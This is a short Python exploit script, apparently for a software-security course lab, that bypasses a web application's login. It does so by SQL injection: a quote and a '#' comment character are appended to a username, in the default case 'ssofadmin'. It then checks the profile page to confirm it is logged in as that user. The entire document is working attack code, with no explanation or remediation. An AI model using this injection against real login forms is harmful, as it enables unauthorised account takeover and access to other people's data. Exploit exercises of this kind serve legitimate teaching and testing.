#!/usr/bin/env python3
import requests, sys, re
from interface import *
from bs4 import BeautifulSoup

if not (2 <= len(sys.argv) <= 3):
    print(f"Usage: {__file__} server_url [username]")
    sys.exit(-1)

url = sys.argv[1]
username = 'ssofadmin'

if len(sys.argv) == 3:
    username = sys.argv[2]
else:
    print(f"[*] Using default username ({username}). You can change it by giving it as an argument")

session = requests.Session()
reset_app(session, url)

payload = f"{username}'#"
password = "???"

r = login(session, url, username=payload, password=password)
soup = BeautifulSoup(r.text, 'html.parser')
title = soup.find_all("title")[0].string

assert title != "LoginFaceFive" # Check if we can login

r = get_profile(session, url)
soup = BeautifulSoup(r.text, 'html.parser')
inp = soup.find(id="usernameInput") # UsernameInput field will have username placeholder

# Check if we it is logged in with the given username
assert soup.find(id="usernameInput")['placeholder'] == username 

print(f"[+] Successfully logged in as {username}!")

session.close()
